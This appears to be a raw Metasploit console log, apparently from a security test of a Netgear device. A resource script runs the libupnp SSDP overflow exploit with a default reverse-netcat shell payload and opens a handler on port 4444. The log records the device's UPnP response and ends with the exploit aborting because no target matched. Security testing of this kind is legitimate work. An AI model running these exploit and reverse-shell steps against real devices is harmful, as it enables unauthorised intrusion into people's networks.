[1m[34m[*][0m Spooling to file exploits/NegearXWN5001.33.log...
resource (script.rc)> use exploits/multi/upnp/libupnp_ssdp_overflow
[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_netcat
resource (script.rc)> exploit -z
[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.0.101:4444 
[1m[34m[*][0m No target matches this fingerprint
[1m[34m[*][0m 
[1m[34m[*][0m     HTTP/1.1 200 OK
[1m[34m[*][0m     ST:upnp:rootdevice
[1m[34m[*][0m     USN:uuid:f0185801-0018-24c4-40e4-ec9400000448::upnp:rootdevice
[1m[34m[*][0m     Location: http://192.168.0.102:56688/dyndev/uuid:f0185801-0018-24c4-40e4-ec9400000448
[1m[34m[*][0m     Server: Custom/1.0 UPnP/1.0 Proc/Ver
[1m[34m[*][0m     EXT:
[1m[34m[*][0m     Cache-Control:max-age=1800
[1m[34m[*][0m     DATE: Fri, 01 Jan 2010 00:02:31 GMT
[1m[34m[*][0m     
[1m[34m[*][0m 
[1m[31m[-][0m Exploit aborted due to failure: no-target: No compatible target detected
[1m[34m[*][0m Exploit completed, but no session was created.
resource (script.rc)> spool off
[0m